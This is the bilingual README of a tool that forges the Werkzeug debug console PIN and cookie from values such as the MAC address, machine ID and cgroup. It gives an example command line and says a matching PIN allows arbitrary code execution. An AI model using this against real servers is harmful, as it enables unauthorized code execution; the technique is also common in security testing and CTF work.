# Werkzeuger

## RU
- Werkzeuger может генерировать дебаг пин и куку для входа в консоль Werkzeug
- Подробнее о генерации пин читайте в моей статье: [Ссылка](https://habr.com/ru/articles/738238/)

![Screenshot](https://github.com/SidneyJob/Generate-flask-pin/blob/main/img/help.png)


**Опции, которые необходимы для генерации пина:**
1) Path
2) MAC 
3) Machine ID 
4) cgroup


**Примеры значений для некоторых опций:**
```
username: user
path: /home/user/.local/lib/python3.11/site-packages/flask/app.py
mac: fc:44:82:9d:ba:02
machine_id: b643ebdac5ee44789d21e98a03ce4bb5
cgroup: 0::/user.slice/user-1000.slice/session-2.scope
modname: flask.app
appname: Flask
```

> Вы можете увидеть список доступных интерфейсов, прочитав файл /proc/net/dev. MAC-адрес интерфейса можно увидеть с помощью файла /sys/class/net/INT/address, где INT — любой интерфейс.



**Примеры работы:**

Оригинальный пин(виден только разработчику):
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/origin.png)


Самостоятельная генерация пина:
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/gen.png)

```python3 gen.py --username user --path /home/user/.local/lib/python3.11/site-packages/flask/app.py --mac fc:44:82:9d:ba:02 --machine_id b643ebdac5ee44789d21e98a03ce4bb5 --cgroup 0::/user.slice/user-1000.slice/session-2.scope```

Пин, который мы сгенерировали совпадает с пином разработчика, а это значит, что теперь мы можем войти в отладочную коносль и выполнить произвольный код 
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/console.png)


Если вы выполняете эти шаги на своем компьютере, вы можете использовать опцию GET, чтобы получить некоторые переменные с вашего компьютера.
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/get.png)

```python3 gen.py GET```

#### Мой канал: https://t.me/SidneyJobChannel
#### Если есть вопросы, то можете написать мне на почту SidneyJob13@gmail.com или в телеграм @SidneyJob







## EN
- Werkzeuger can generate a debug pin and a cookie to enter the Werkzeug debug console
- Read more about generating pin in my article: [Link](https://habr.com/ru/articles/738238/)

![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/help.png)

**Required options to generate pin:**
1) Path
2) MAC 
3) Machine ID 
4) cgroup


**Example values for some options:**
```
username: user
path: /home/user/.local/lib/python3.11/site-packages/flask/app.py
mac: fc:44:82:9d:ba:02
machine_id: b643ebdac5ee44789d21e98a03ce4bb5
cgroup: 0::/user.slice/user-1000.slice/session-2.scope
modname: flask.app
appname: Flask
```

> You can see the list of available interfaces by reading the /proc/net/dev file. But the MAC address of an interface can be seen using the /sys/class/net/INT/address file, where INT is any interface.


**Примеры работы:**

Original pin (only visible to the developer):
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/origin.png)


Self-generated pin:
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/gen.png)

```python3 gen.py --username user --path /home/user/.local/lib/python3.11/site-packages/flask/app.py --mac fc:44:82:9d:ba:02 --machine_id b643ebdac5ee44789d21e98a03ce4bb5 --cgroup 0::/user.slice/user-1000.slice/session-2.scope```

The pin we generated is the same as the developer pin, which means that we can now enter the debug console and execute arbitrary code
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/console.png)


If you are following these steps on your computer, you can use the GET option to get some variables from your computer.
![Screenshot](https://github.com/SidneyJob/Werkzeuger/blob/main/img/get.png)

```python3 gen.py GET```

#### My channel: https://t.me/SidneyJobChannel
#### If you have any questions, you can write to me at SidneyJob13@gmail.com or telegram @SidneyJob
